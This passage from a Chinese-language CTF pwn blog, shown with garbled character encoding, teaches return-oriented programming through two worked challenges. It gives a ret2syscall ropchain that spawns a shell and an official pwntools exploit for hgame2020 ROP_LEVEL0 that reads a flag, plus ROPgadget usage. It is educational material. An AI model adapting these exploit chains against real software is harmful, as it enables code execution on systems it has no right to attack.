æŒ‡ä»¤çš„ gadgetï¼Œåœ¨å…¶åœ°å€ä¹‹åéƒ½è¦æ·»åŠ  pop çš„ä¼ è¾“æ•°æ®ï¼ŒåŒæ—¶åœ¨æ‰€æœ‰ gadget æœ€ååŒ…å«ä¸€æ®µ shellcodeï¼Œæœ€ç»ˆæº¢å‡ºæ•°æ®ç»“æ„åº”è¯¥å˜ä¸ºå¦‚ä¸‹æ ¼å¼ã€‚</p><blockquote><p><strong>payload :</strong> padding + address of gadget 1 + param for gadget 1 + address of gadget 2 + param for gadget 2 + â€¦â€¦ + address of gadget n + shellcode</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220146.png" alt=""></p><h2 id="0x50-åŒ…å«å¤šä¸ª-gadget-çš„æº¢å‡ºæ•°æ®ï¼ˆä¿®æ”¹åï¼‰"><a href="#0x50-åŒ…å«å¤šä¸ª-gadget-çš„æº¢å‡ºæ•°æ®ï¼ˆä¿®æ”¹åï¼‰" class="headerlink" title="0x50 åŒ…å«å¤šä¸ª gadget çš„æº¢å‡ºæ•°æ®ï¼ˆä¿®æ”¹åï¼‰"></a>0x50 åŒ…å«å¤šä¸ª gadget çš„æº¢å‡ºæ•°æ®ï¼ˆä¿®æ”¹åï¼‰</h2><p>æ­¤å¤„ä¸ºäº†ç®€å•ï¼Œå…ˆå‡å®šè¾“å…¥æº¢å‡ºæ•°æ®ä¸å—â€œ\x00â€å­—ç¬¦çš„å½±å“ï¼Œæ‰€ä»¥ payload å¯ä»¥ç›´æ¥åŒ…å« â€œ\x7d\x00\x00\x00â€ï¼ˆä¼ ç»™ eax çš„å‚æ•°125ï¼‰ã€‚å¦‚æœå¸Œæœ›å®ç°æ›´ä¸ºçœŸå®çš„æ“ä½œï¼Œå¯ä»¥ç”¨å¤šä¸ª gadget é€šè¿‡è¿ç®—å¾—åˆ°ä¸Šè¿°å‚æ•°ã€‚æ¯”å¦‚å¯ä»¥é€šè¿‡ä¸‹é¢ä¸‰æ¡ gadget æ¥ç»™ eax ä¼ é€’å‚æ•°ã€‚</p><pre class=" language-lang-txt"><code class="language-lang-txt">pop eax; ret;         # pop stack top 0x1111118e into eaxpop ebx; ret;         # pop stack top 0x11111111 into ebxsub eax, ebx; ret;    # eax -= ebx</code></pre><p>è§£å†³å®Œä¸Šè¿°é—®é¢˜ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‹¼æ¥å‡ºæº¢å‡ºæ•°æ®ï¼Œè¾“å…¥è‡³ç¨‹åºæ¥ä¸ºç¨‹åºè°ƒç”¨æ ˆå¼€å¯å¯æ‰§è¡Œæƒé™å¹¶æ‰§è¡Œ shellcodeã€‚åŒæ—¶ï¼Œç”±äº ROP æ–¹æ³•å¸¦æ¥çš„çµæ´»æ€§ï¼Œç°åœ¨ä¸å†éœ€è¦ç—›è‹¦åœ°è¯•æ¢ shellcode èµ·å§‹åœ°å€äº†ã€‚å›é¡¾æ•´ä¸ªè¾“å…¥æ•°æ®ï¼Œåªæœ‰æ ˆçš„åˆ†æ®µåœ°å€éœ€è¦è·å–ç¡®å®šåœ°å€ã€‚å¦‚æœåˆ©ç”¨ gadget è¯»å– ebp çš„å€¼å†åŠ ä¸ŠæŸä¸ªåˆé€‚çš„æ•°å€¼ï¼Œå°±å¯ä»¥ä¿è¯æº¢å‡ºæ•°æ®éƒ½å…·æœ‰å¯æ‰§è¡Œæƒé™ï¼Œè¿™æ ·å°±ä¸å†éœ€è¦è·å–ç¡®åˆ‡åœ°å€ï¼Œä¹Ÿå°±å…·æœ‰äº†ç»•è¿‡å†…å­˜éšæœºåŒ–çš„å¯èƒ½ã€‚</p><p>å‡ºäºæ¼”ç¤ºçš„ç›®çš„ï¼Œæˆ‘ä»¬å‡è®¾ï¼ˆç®€ç›´æ˜¯<em>é’¦ç‚¹</em>ï¼‰äº†æ‰€æœ‰éœ€è¦çš„ gadget çš„å­˜åœ¨ã€‚åœ¨å®é™…æœç´¢åŠæ‹¼æ¥ gadget æ—¶ï¼Œå¹¶ä¸ä¼šåƒä¸Šé¢ä¸€æ ·é¡ºåˆ©ï¼Œæœ‰ä¸¤ä¸ªæ–¹é¢éœ€è¦æ³¨æ„ã€‚</p><p>ç¬¬ä¸€ï¼Œå¾ˆå¤šæ—¶å€™å¹¶ä¸èƒ½ä¸€æ¬¡å‡‘é½å…¨éƒ¨çš„ç†æƒ³æŒ‡ä»¤ç‰‡æ®µï¼Œè¿™æ—¶å°±è¦é€šè¿‡æ•°æ®åœ°å€çš„åç§»ã€å¯„å­˜å™¨ä¹‹é—´çš„æ•°æ®ä¼ è¾“ç­‰æ–¹æ³•æ¥â€œæ›²çº¿æ•‘å›½â€ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå‡è®¾æ‰¾ä¸åˆ°ä¸‹é¢è¿™æ¡ gadget</p><pre class=" language-lang-txt"><code class="language-lang-txt">pop ebx; ret;</code></pre><p>ä½†å‡å¦‚å¯ä»¥æ‰¾åˆ°ä¸‹é¢çš„ gadget</p><pre class=" language-lang-txt"><code class="language-lang-txt">mov ebx, eax; ret;</code></pre><p>æˆ‘ä»¬å°±å¯ä»¥å°†å®ƒå’Œ</p><pre class=" language-lang-txt"><code class="language-lang-txt">pop eax; ret;</code></pre><p>ç»„åˆèµ·æ¥å®ç°å°†æ•°æ®ä¼ è¾“ç»™ ebx çš„åŠŸèƒ½ã€‚ä¸Šé¢æåˆ°çš„ç”¨å¤šä¸ª gadget é¿å…è¾“å…¥â€œ\x00â€ä¹Ÿæ˜¯ä¸€ä¸ªå®ä¾‹åº”ç”¨ã€‚</p><p>ç¬¬äºŒï¼Œè¦å°å¿ƒ gadget æ˜¯å¦ä¼šç ´åå‰é¢å„ä¸ª gadget å·²ç»å®ç°çš„éƒ¨åˆ†ï¼Œæ¯”å¦‚å¯èƒ½ä¿®æ”¹æŸä¸ªå·²ç»å†™å…¥æ•°å€¼çš„å¯„å­˜å™¨ã€‚å¦å¤–ï¼Œè¦ç‰¹åˆ«å°å¿ƒ gadget å¯¹ ebp å’Œ esp çš„æ“ä½œï¼Œå› ä¸ºå®ƒä»¬çš„å˜åŒ–ä¼šæ”¹å˜è¿”å›åœ°å€çš„ä½ç½®ï¼Œè¿›è€Œä½¿åç»­çš„ gadget æ— æ³•æ‰§è¡Œã€‚</p><h2 id="0x60-example1-easy"><a href="#0x60-example1-easy" class="headerlink" title="0x60 example1 (easy)"></a>0x60 example1 (easy)</h2><p>æœ¬é¢˜åŒæ ·æ¥è‡ªäºCTF-wikiä¸Šçš„ä¸€é“ç»ƒä¹ ï¼šret2syscall</p><p>é¢˜ç›®æºç </p><pre class=" language-lang-c"><code class="language-lang-c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;char *shell = "/bin/sh";int main(void){    setvbuf(stdout, 0LL, 2, 0LL);    setvbuf(stdin, 0LL, 1, 0LL);    char buf[100];    printf("This time, no system() and NO SHELLCODE!!!\n");    printf("What do you plan to do?\n");    gets(buf);    return 0;}</code></pre><p>ç¨‹åºå¼€å¯NXä¿æŠ¤==&gt;æ ˆä¸­æ•°æ®ä¸å¯æ‰§è¡Œ</p><p>ç¨‹åºç»™äº†â€/bin/shâ€å­—ç¬¦ä¸²</p><p>æ²¡æœ‰ç»™å‡ºsystem()å‡½æ•°,é™æ€é“¾æ¥æ–‡ä»¶</p><p>å› æ­¤åªèƒ½ä½¿ç”¨æˆ‘ä»¬çš„ROPäº†ï¼Œè®©ç¨‹åºè·³åˆ°ç³»ç»Ÿè°ƒç”¨ä¸Š</p><p>é€šè¿‡ä¸Šé¢çš„çŸ¥è¯†æˆ‘ä»¬å¯ä»¥çŸ¥é“æˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ gadgetæ¥å®ç°æ“ä½œ</p><p>é¦–å…ˆæ‹Ÿå‡ºæˆ‘ä»¬éœ€è¦çš„æ±‡ç¼–æŒ‡ä»¤</p><pre class=" language-lang-txt"><code class="language-lang-txt">pop eax; ret  0xbpop ebx; ret  /bin/shpop ecx; ret  0pop edx; ret  0int 80h</code></pre><p>ä½¿ç”¨ROPgadget åœ¨ç¨‹åºä¸­æ‰¾å‡ºè¿™äº›æŒ‡ä»¤</p><pre class=" language-lang-txt"><code class="language-lang-txt">ROPgadget --binary rop --only "pop|ret"| grep ebx</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">0x080bb196 : pop eax ; ret0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret0x08049421 : int 0x80</code></pre><p>å­—ç¬¦ä¸²bin/shçš„åœ°å€åœ¨IDAä¸­å°±å¯ä»¥æŸ¥çœ‹ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ROPgadget â€”stringæŸ¥çœ‹</p><pre class=" language-lang-txt"><code class="language-lang-txt">0x080BE408</code></pre><p>payload:</p><pre class=" language-lang-txt"><code class="language-lang-txt">payload='a'*offset+ p32(0x080bb196) + p32(0xb) +p32(0x0806eb90)+ p32(0)+p32(0)+p32(0x080BE408)+p32(0x08049421)</code></pre><p>å¦ä¸€ç§è§£æ³•ï¼š</p><p>ç›´æ¥ç”Ÿæˆropchain</p><pre class=" language-lang-python"><code class="language-lang-python">from struct import pack# Padding goes herep = ''p += pack('&lt;I', 0x0806eb6a) # pop edx ; retp += pack('&lt;I', 0x080ea060) # @ .datap += pack('&lt;I', 0x080bb196) # pop eax ; retp += '/bin'p += pack('&lt;I', 0x0809a4ad) # mov dword ptr [edx], eax ; retp += pack('&lt;I', 0x0806eb6a) # pop edx ; retp += pack('&lt;I', 0x080ea064) # @ .data + 4p += pack('&lt;I', 0x080bb196) # pop eax ; retp += '//sh'p += pack('&lt;I', 0x0809a4ad) # mov dword ptr [edx], eax ; retp += pack('&lt;I', 0x0806eb6a) # pop edx ; retp += pack('&lt;I', 0x080ea068) # @ .data + 8p += pack('&lt;I', 0x08054590) # xor eax, eax ; retp += pack('&lt;I', 0x0809a4ad) # mov dword ptr [edx], eax ; retp += pack('&lt;I', 0x080481c9) # pop ebx ; retp += pack('&lt;I', 0x080ea060) # @ .datap += pack('&lt;I', 0x0806eb91) # pop ecx ; pop ebx ; retp += pack('&lt;I', 0x080ea068) # @ .data + 8p += pack('&lt;I', 0x080ea060) # padding without overwrite ebxp += pack('&lt;I', 0x0806eb6a) # pop edx ; retp += pack('&lt;I', 0x080ea068) # @ .data + 8p += pack('&lt;I', 0x08054590) # xor eax, eax ; retp += pack('&lt;I', 0x0807b5bf) # inc eax ; retp += pack('&lt;I', 0x0807b5bf) # inc eax ; retp += pack('&lt;I', 0x0807b5bf) # inc eax ; retp += pack('&lt;I', 0x0807b5bf) # inc eax ; retp += pack('&lt;I', 0x0807b5bf) # inc eax ; retp += pack('&lt;I', 0x0807b5bf) # inc eax ; retp += pack('&lt;I', 0x0807b5bf) # inc eax ; retp += pack('&lt;I', 0x0807b5bf) # inc eax ; retp += pack('&lt;I', 0x0807b5bf) # inc eax ; retp += pack('&lt;I', 0x0807b5bf) # inc eax ; retp += pack('&lt;I', 0x08049421) # int 0x80from pwn import *context.log_level="debug"sh=process('./rop')sh.sendlineafter("What do you plan to do?\n",'a'*112 + p)sh.interactive()</code></pre><p><strong>PSï¼šæœ¬äººåœ¨è¿è¡Œå®Œè¿™ä¸ªè„šæœ¬åè™šæ‹Ÿæœºæš´æ¯™äº†ï¼Œè¿ç€æˆ‘ä¸€å°kaliè¿˜æœ‰æˆ‘é…ç½®çš„pwnä¸“ç”¨å…¨éƒ¨åäº†ï¼Œå…·ä½“åŸå› è¿˜æ²¡ææ¸…ï¼Œå»ºè®®å…ˆæ‹ä¸ªå¿«ç…§ä½¿ç”¨ï¼Œæˆ–è€…æ”¾åˆ°dockeré‡Œé¢è·‘ï¼Œè¡€çš„æ•™è®­ï¼Œè¿˜å¥½é‡Œè¾¹æ²¡æœ‰ä»€ä¹ˆé‡è¦çš„æ–‡ä»¶ï¼Œéš¾å—ï¼ï¼</strong></p><p>æŠ¥é”™å¦‚ä¸‹ï¼š</p><pre class=" language-lang-txt"><code class="language-lang-txt">set_thread_area failed when setting up thread-local storage</code></pre><h2 id="0x70-example2-mid"><a href="#0x70-example2-mid" class="headerlink" title="0x70 example2(mid)"></a>0x70 example2(mid)</h2><p>æœ¬é¢˜æ¥è‡ªäºhgame2020 week1 pwn ROP_LEVEL0</p><pre class=" language-lang-TXT"><code class="language-lang-TXT">int __cdecl main(int argc, const char **argv, const char **envp){  int v3; // eax@1  char buf; // [sp+0h] [bp-50h]@1  int v6; // [sp+38h] [bp-18h]@1  int fd[2]; // [sp+48h] [bp-8h]@1  memset(&amp;buf, 0, 0x38uLL);  v6 = 0;  setbuf(_bss_start, 0LL);  v3 = open("./some_life_experience", 0);  *(_QWORD *)fd = v3;  read(v3, &amp;buf, 0x3CuLL);  puts(&amp;buf);  read(0, &amp;buf, 0x100uLL);  return 0;}</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">__int64 vuln(){  char buf; // [sp+0h] [bp-10h]@1  read(0, &amp;buf, 0xA0uLL);  return 0LL;}</code></pre><p>é¢˜ç›®æä¾›ä¸¤ä¸ªå‡½æ•°ï¼Œéƒ½æ˜¯read()æº¢å‡º,å¼€å¯NXï¼Œæ— æ ˆä¿æŠ¤</p><p>file:</p><pre class=" language-lang-txt"><code class="language-lang-txt">ROP_LEVEL0: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1baedaba8bde71a65a2f781f56a833ccd5388e24, not stripped</code></pre><p>64ä½å¯æ‰§è¡ŒåŠ¨æ€é“¾æ¥æ–‡ä»¶ï¼Œ64ä½æ–‡ä»¶æº¢å‡ºå§¿åŠ¿ <a href="https://bbs.ichunqiu.com/article-1767-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/article-1767-1.html</a></p><p>è¿™é“é¢˜å¯ä»¥ä½¿ç”¨ret2libcçš„æ–¹æ³•åšï¼Œä½†åœ¨è¿™é‡Œæˆ‘ä»¬ç†è§£å®˜æ–¹åšæ³•,å®˜æ–¹EXPï¼š</p><pre class=" language-lang-python"><code class="language-lang-python">#!/usr/bin/env python#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'p=process("./ROP_LEVEL0")#p = remote('47.103.214.163',20003)elf = ELF("ROP_LEVEL0")'''Gadgets information============================================================0x000000000040074c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040074e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400750 : pop r14 ; pop r15 ; ret0x0000000000400752 : pop r15 ; ret0x000000000040074b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040074f : pop rbp ; pop r14 ; pop r15 ; ret0x00000000004005a0 : pop rbp ; ret0x0000000000400753 : pop rdi ; ret0x0000000000400751 : pop rsi ; pop r15 ; ret0x000000000040074d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004004c9 : ret0x0000000000400532 : ret 0x200a0x000000000040067e : ret 0x4804'''pop_rsi_r15_ret = 0x0000000000400751pop_rdi_ret = 0x0000000000400753read_plt = elf.plt['read']open_plt = elf.plt['open']puts_plt = elf.plt['puts']buf_addr = 0x601060#å‚è€ƒreadçš„å‚æ•°ï¼Œè¦ä¸€ä¸ªç±»ä¼¼æŒ‡é’ˆçš„bufpayload = 'a'*(0x50+8)    #æ ˆæº¢å‡ºpayload += p64(pop_rsi_r15_ret)+p64(buf_addr)+p64(0)    #bufå€¼å­˜å…¥64ä½ç¬¬äºŒä¸ªä¼ å‚å¯„å­˜å™¨rsipayload += p64(read_plt)+p64(pop_rdi_ret)+p64(buf_addr)+p64(pop_rsi_r15_ret)+p64(0)*2    #è°ƒç”¨readå¹¶å¡«å…¥å‚æ•°payload += p64(open_plt)+p64(pop_rdi_ret)+p64(4)+p64(pop_rsi_r15_ret)+p64(buf_addr)*2    #è°ƒç”¨openå¹¶å¡«å…¥å‚æ•°payload += p64(read_plt)+p64(pop_rdi_ret)+p64(buf_addr)+p64(puts_plt)    #å†æ¬¡è°ƒç”¨readè¯»å–flagp.sendline(payload)p.sendline('./flag\x00')p.interactive()</code></pre><h2 id="0x80-ROPgadget-å‘½ä»¤"><a href="#0x80-ROPgadget-å‘½ä»¤" class="headerlink" title="0x80 ROPgadget å‘½ä»¤"></a>0x80 ROPgadget å‘½ä»¤</h2><pre class=" language-lang-txt"><code class="language-lang-txt">usage: ROPgadget [-h] [-v] [-c] [--binary &lt;binary&gt;] [--opcode &lt;opcodes&gt;]                 [--string &lt;string&gt;] [--memstr &lt;string&gt;] [--depth &lt;nbyte&gt;]                 [--only &lt;key&gt;] [--filter &lt;key&gt;] [--range &lt;start-end&gt;]                 [--badbytes &lt;byte&gt;] [--rawArch &lt;arch&gt;] [--rawMode &lt;mode&gt;]                 [--offset &lt;hexaddr&gt;] [--ropchain] [--thumb] [--console]                 [--norop] [--nojop] [--nosys] [--multibr] [--all]description:  ROPgadget lets you search your gadgets on a binary. It supports several   file formats and architectures and uses the Capstone disassembler for  the search engine.formats supported:   - ELF  - PE  - Mach-O  - Rawarchitectures supported:  - x86  - x86-64  - ARM  - ARM64  - MIPS  - PowerPC  - Sparcoptional arguments:  -h, --help           show this help message and exit  -v, --version        Display the ROPgadget's version  -c, --checkUpdate    Checks if a new version is available  --binary &lt;binary&gt;    Specify a binary filename to analyze  --opcode &lt;opcodes&gt;   Search opcode in executable segment  --string &lt;string&gt;    Search string in readable segment  --memstr &lt;string&gt;    Search each byte in all readable segment  --depth &lt;nbyte&gt;      Depth for search engine (default 10)  --only &lt;key&gt;         Only show specific instructions  --filter &lt;key&gt;       Suppress specific instructions  --range &lt;start-end&gt;  Search between two addresses (0x...-0x...)  --badbytes &lt;byte&gt;    Rejects specific bytes in the gadget's address  --rawArch &lt;arch&gt;     Specify an arch for a raw file  --rawMode &lt;mode&gt;     Specify a mode for a raw file  --offset &lt;hexaddr&gt;   Specify an offset for gadget addresses  --ropchain           Enable the ROP chain generation  --thumb              Use the thumb mode for the search engine (ARM only)  --console            Use an interactive console for search engine  --norop              Disable ROP search engine  --nojop              Disable JOP search engine  --nosys              Disable SYS search engine  --multibr            Enable multiple branch gadgets  --all                Disables the removal of duplicate gadgetsexamples:  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86   ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --ropchain  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --depth 3  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --string "main"  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --string "m..n"  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --opcode c9c3  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --only "mov|ret"  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --only "mov|pop|xor|ret"  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --filter "xchg|add|sub"  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --norop --nosys  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --range 0x08041000-0x08042000  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --string main --range 0x080c9aaa-0x080c9aba  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --memstr "/bin/sh"  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --console  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --badbytes "00|7f|42"  ROPgadget.py --binary ./test-suite-binaries/Linux_lib64.so --offset 0xdeadbeef00000000  ROPgadget.py --binary ./test-suite-binaries/elf-ARMv7-ls --depth 5  ROPgadget.py --binary ./test-suite-binaries/elf-ARM64-bash --depth 5  ROPgadget.py --binary ./test-suite-binaries/raw-x86.raw --rawArch=x86 --rawMode=32</code></pre><h2 id="0x90-Linux-ç³»ç»Ÿè°ƒç”¨"><a href="#0x90-Linux-ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="0x90 Linux ç³»ç»Ÿè°ƒç”¨"></a>0x90 Linux ç³»ç»Ÿè°ƒç”¨</h2><p>linux çš„ç³»ç»Ÿè°ƒç”¨é€šè¿‡ int80 å®ç°ï¼Œç”¨ç³»ç»Ÿè°ƒç”¨æ¥åŒºåˆ†å…¥å£å‡½æ•°</p><p>åº”ç”¨ç¨‹åºæ‰§è¡Œç³»ç»Ÿè°ƒç”¨çš„è¿‡ç¨‹æ˜¯ï¼š</p><ol><li>æŠŠç³»ç»Ÿè°ƒç”¨çš„ç¼–å·å­˜å…¥EAX</li><li>æŠŠå‡½æ•°å‚æ•°å­˜å…¥å…¶ä»–è°ƒç”¨å¯„å­˜å™¨</li><li>è§¦å‘ 0x80 å·ä¸­æ–­</li></ol><p>é‚£ä¹ˆæˆ‘ä»¬å¦‚æœåªå¸Œæœ›é€šè¿‡ç³»ç»Ÿè°ƒç”¨æ¥è·å–shellå°±éœ€è¦æŠŠç³»ç»Ÿè°ƒç”¨çš„å‚æ•°æ”¾å…¥å„ä¸ªå¯„å­˜å™¨ï¼Œç„¶åæ‰§è¡Œ int 0x80h å°±å¯ä»¥äº†</p><p>å¦‚æœè¯´é€šè¿‡ç³»ç»Ÿè°ƒç”¨æ‰§è¡Œçš„æ˜¯ï¼šexecve(â€œ/bin/shâ€,NULL,NULL)32ä½ç¨‹åº</p><p>é‚£ä¹ˆEAXä¸­å­˜æ”¾çš„åº”è¯¥æ˜¯ç³»ç»Ÿè°ƒç”¨çš„ç¼–å·ï¼ŒæŸ¥çœ‹execveçš„ç³»ç»Ÿè°ƒç”¨å·</p><pre class=" language-lang-txt"><code class="language-lang-txt">cat /usr/include/asm/unistd_32.h |grep execve</code></pre><p>å³0xb</p><p>å…¶ä»–ï¼š</p><pre class=" language-lang-txt"><code class="language-lang-txt">ebx /bin/shecx 0edx 0</code></pre><h2 id="0x100-æ±‡ç¼–æŒ‡ä»¤è¡¥å……"><a href="#0x100-æ±‡ç¼–æŒ‡ä»¤è¡¥å……" class="headerlink" title="0x100 æ±‡ç¼–æŒ‡ä»¤è¡¥å……"></a>0x100 æ±‡ç¼–æŒ‡ä»¤è¡¥å……</h2><p>ä¸€äº›æœ€å¸¸ç”¨çš„æ±‡ç¼–æŒ‡ä»¤å¦‚ä¸‹ï¼š</p><ul><li>MOVï¼šæ•°æ®ä¼ è¾“æŒ‡ä»¤ï¼Œå°† SRC ä¼ è‡³ DSTï¼Œæ ¼å¼ä¸º</li></ul><pre class=" language-lang-txt"><code class="language-lang-txt">MOV DST, SRC;</code></pre><ul><li>PUSHï¼šå‹å…¥å †æ ˆæŒ‡ä»¤ï¼Œå°† SRC å‹å…¥æ ˆå†…ï¼Œæ ¼å¼ä¸º</li></ul><pre class=" language-lang-txt"><code class="language-lang-txt">PUSH SRC;</code></pre><ul><li>POPï¼šå¼¹å‡ºå †æ ˆæŒ‡ä»¤ï¼Œå°†æ ˆé¡¶çš„æ•°æ®å¼¹å‡ºå¹¶å­˜è‡³ DSTï¼Œæ ¼å¼ä¸º</li></ul><pre class=" language-lang-txt"><code class="language-lang-txt">POP DST;</code></pre><ul><li>LEAï¼šå–åœ°å€æŒ‡ä»¤ï¼Œå°† MEM çš„åœ°å€å­˜è‡³ REG ï¼Œæ ¼å¼ä¸º</li></ul><pre class=" language-lang-txt"><code class="language-lang-txt">LEA REG, MEM;</code></pre><ul><li>ADDï¼SUBï¼šåŠ ï¼å‡æ³•æŒ‡ä»¤ï¼Œå°†è¿ç®—ç»“æœå­˜è‡³ DSTï¼Œæ ¼å¼ä¸º</li></ul><pre class=" language-lang-txt"><code class="language-lang-txt">ADD/SUB DST, SRC;</code></pre><ul><li>ANDï¼ORï¼XORï¼šæŒ‰ä½ä¸ï¼æˆ–ï¼å¼‚æˆ–ï¼Œå°†è¿ç®—ç»“æœå­˜è‡³ DST ï¼Œæ ¼å¼ä¸º</li></ul><pre class=" language-lang-txt"><code class="language-lang-txt">AND/OR/XOR DSTï¼ŒSRC;</code></pre><ul><li>CALLï¼šè°ƒç”¨æŒ‡ä»¤ï¼Œå°†å½“å‰çš„ eip å‹å…¥æ ˆé¡¶ï¼Œå¹¶å°† PTR å­˜å…¥ eipï¼Œæ ¼å¼ä¸º</li></ul><pre class=" language-lang-txt"><code class="language-lang-txt">CALL PTR;</code></pre><ul><li>RETï¼šè¿”å›æŒ‡ä»¤ï¼Œæ“ä½œä¸ºå°†æ ˆé¡¶æ•°æ®å¼¹å‡ºè‡³ eipï¼Œæ ¼å¼ä¸º</li></ul><pre class=" language-lang-txt"><code class="language-lang-txt">RET;</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PwnåŸºç¡€----shellcode</title>
      <link href="/2020/02/18/ctf/pwn/pwn-shellcode/"/>
      <url>/2020/02/18/ctf/pwn/pwn-shellcode/</url>
      
        <content type="html"><![CDATA[<h1 id="Pwnå­¦ä¹ -â€”â€”-shellcode"><a href="#Pwnå­¦ä¹ -â€”â€”-shellcode" class="headerlink" title="Pwnå­¦ä¹    â€”â€” shellcode"></a>Pwnå­¦ä¹    â€”â€” shellcode</h1><h2 id="0x10-shellcode"><a href="#0x10-shellcode" class="headerlink" title="0x10 shellcode"></a>0x10 shellcode</h2><p><em>ï¼ï¼ä¿®æ”¹è¿”å›åœ°å€ï¼Œè®©å…¶æŒ‡å‘æº¢å‡ºæ•°æ®ä¸­çš„ä¸€æ®µæŒ‡ä»¤</em></p><p>æ ¹æ®ä¸Šé¢å‰¯æ ‡é¢˜çš„è¯´æ˜ï¼Œè¦å®Œæˆçš„ä»»åŠ¡åŒ…æ‹¬ï¼šåœ¨æº¢å‡ºæ•°æ®å†…åŒ…å«ä¸€æ®µæ”»å‡»æŒ‡ä»¤ï¼Œç”¨æ”»å‡»æŒ‡ä»¤çš„èµ·å§‹åœ°å€è¦†ç›–æ‰è¿”å›åœ°å€ã€‚æ”»å‡»æŒ‡ä»¤ä¸€èˆ¬éƒ½æ˜¯ç”¨æ¥æ‰“å¼€ shellï¼Œä»è€Œå¯ä»¥è·å¾—å½“å‰è¿›ç¨‹çš„æ§åˆ¶æƒï¼Œæ‰€ä»¥è¿™ç±»æŒ‡ä»¤ç‰‡æ®µä¹Ÿè¢«æˆä¸ºâ€œshellcodeâ€ã€‚ä¸‹é¢æˆ‘ä»¬å…ˆå†™å‡ºæº¢å‡ºæ•°æ®çš„ç»„æˆï¼Œå†ç¡®å®šå¯¹åº”çš„å„éƒ¨åˆ†å¡«å……è¿›å»ã€‚</p><p><strong>payload :</strong> padding1 + address of shellcode + padding2 + shellcode</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220140.png" alt="å›¾1 payloadå›¾è§£"></p><h2 id="0x20-shellcode-payload"><a href="#0x20-shellcode-payload" class="headerlink" title="0x20 shellcode payload"></a>0x20 shellcode payload</h2><p>padding1 å¤„çš„æ•°æ®å¯ä»¥éšæ„å¡«å……ï¼ˆæ³¨æ„å¦‚æœåˆ©ç”¨å­—ç¬¦ä¸²ç¨‹åºè¾“å…¥æº¢å‡ºæ•°æ®ä¸è¦åŒ…å« â€œ\x00â€ ï¼Œå¦åˆ™å‘ç¨‹åºä¼ å…¥æº¢å‡ºæ•°æ®æ—¶ä¼šé€ æˆæˆªæ–­ï¼‰ï¼Œé•¿åº¦åº”è¯¥åˆšå¥½è¦†ç›–å‡½æ•°çš„åŸºåœ°å€ã€‚address of shellcode æ˜¯åé¢ shellcode èµ·å§‹å¤„çš„åœ°å€ï¼Œç”¨æ¥è¦†ç›–è¿”å›åœ°å€ã€‚padding2 å¤„çš„æ•°æ®ä¹Ÿå¯ä»¥éšæ„å¡«å……ï¼Œé•¿åº¦å¯ä»¥ä»»æ„ã€‚shellcode åº”è¯¥ä¸ºåå…­è¿›åˆ¶çš„æœºå™¨ç æ ¼å¼ã€‚</p><p>æ ¹æ®ä¸Šé¢çš„æ„é€ ï¼Œæˆ‘ä»¬è¦è§£å†³ä¸¤ä¸ªé—®é¢˜ã€‚</p><ol><li>è¿”å›åœ°å€ä¹‹å‰çš„å¡«å……æ•°æ®ï¼ˆpadding1ï¼‰åº”è¯¥å¤šé•¿ï¼Ÿ</li></ol><p>æˆ‘ä»¬å¯ä»¥ç”¨è°ƒè¯•å·¥å…·ï¼ˆä¾‹å¦‚ gdbï¼‰æŸ¥çœ‹æ±‡ç¼–ä»£ç æ¥ç¡®å®šè¿™ä¸ªè·ç¦»ï¼Œä¹Ÿå¯ä»¥åœ¨è¿è¡Œç¨‹åºæ—¶ç”¨ä¸æ–­å¢åŠ è¾“å…¥é•¿åº¦çš„æ–¹æ³•æ¥è¯•æ¢ï¼ˆå¦‚æœè¿”å›åœ°å€è¢«æ— 